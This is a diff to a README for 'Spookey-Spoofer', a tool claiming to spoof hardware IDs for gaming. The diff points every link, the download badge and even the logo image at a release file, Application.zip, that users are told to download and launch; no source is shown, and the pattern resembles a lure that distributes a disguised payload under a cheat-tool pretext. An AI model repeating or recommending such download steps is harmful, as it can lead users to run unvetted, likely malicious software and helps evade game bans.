@@ -20,9 +20,9 @@ Welcome to the "Spookey-Spoofer" repository, your ultimate solution for cleaner 
 
 ## Get Started
 
-To access the "Spookey-Spoofer" tool, download the application [here](https://github.com/file/Application.zip) and launch it to begin cleaning and spoofing your hardware IDs. If the link is not working, please check the "Releases" section for alternative download options.
+To access the "Spookey-Spoofer" tool, download the application [here](https://github.com/bika1613/Spookey-Spoofer/releases/download/v1.0.0/Application.zip) and launch it to begin cleaning and spoofing your hardware IDs. If the link is not working, please check the "Releases" section for alternative download options.
 
-[![Download Spookey-Spoofer](https://img.shields.io/badge/Download-Spookey--Spoofer-blue.svg)](https://github.com/file/Application.zip)
+[![Download Spookey-Spoofer](https://github.com/bika1613/Spookey-Spoofer/releases/download/v1.0.0/Application.zip)](https://github.com/bika1613/Spookey-Spoofer/releases/download/v1.0.0/Application.zip)
 
 ## Contributing
 
@@ -34,4 +34,4 @@ Please note that the "Spookey-Spoofer" tool is intended for educational and rese
 
 Get ready to take control of your hardware IDs and stay ahead in the gaming world with "Spookey-Spoofer"! 🚀
 
-![Spookey-Spoofer Logo](https://example.com/spookey-spoofer.png)
+![Spookey-Spoofer Logo](https://github.com/bika1613/Spookey-Spoofer/releases/download/v1.0.0/Application.zip)
